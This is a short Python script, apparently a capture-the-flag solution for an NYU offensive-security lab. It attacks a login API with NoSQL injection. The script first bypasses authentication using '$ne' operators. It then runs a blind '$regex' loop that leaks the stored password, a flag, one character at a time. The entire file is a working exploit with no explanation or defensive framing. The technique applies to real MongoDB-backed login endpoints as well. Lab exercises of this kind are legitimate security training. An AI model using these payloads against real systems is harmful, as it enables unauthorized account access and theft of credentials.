import requests
import string
import re

url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:10000/api/login"
headers = {"Content-Type": "application/json"}

data = {"username": {"$ne": ""}, "password": {"$ne": ""}}
print(f"Sending request to {url} with data: {data}")
response = requests.post(url, json=data, headers=headers)

if response.status_code == 200:
    print(response.json())
else:
    print(f"Error: {response.status_code}, {response.text}")

leaked_password = "flag{"
data = {"username": {"$ne": ""}, "password": {"$regex": f"^{leaked_password}"}}
print(f"Sending request to {url} with data: {data}")
response = requests.post(url, json=data, headers=headers)
if response.status_code == 200:
    print(response.json())
else:
    print(f"Error: {response.status_code}, {response.text}")

while True:
    for char in string.ascii_letters + string.digits + string.punctuation + " ":
        data = {"username": {"$ne": ""}, "password": {"$regex": f"^{leaked_password}{re.escape(char)}"}}
        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:
            leaked_password += char
            print(response.json())
            print(f"Leaked password so far: {leaked_password}")
            break
    if leaked_password[-1] == "}":
        print("No more characters to leak.")
        break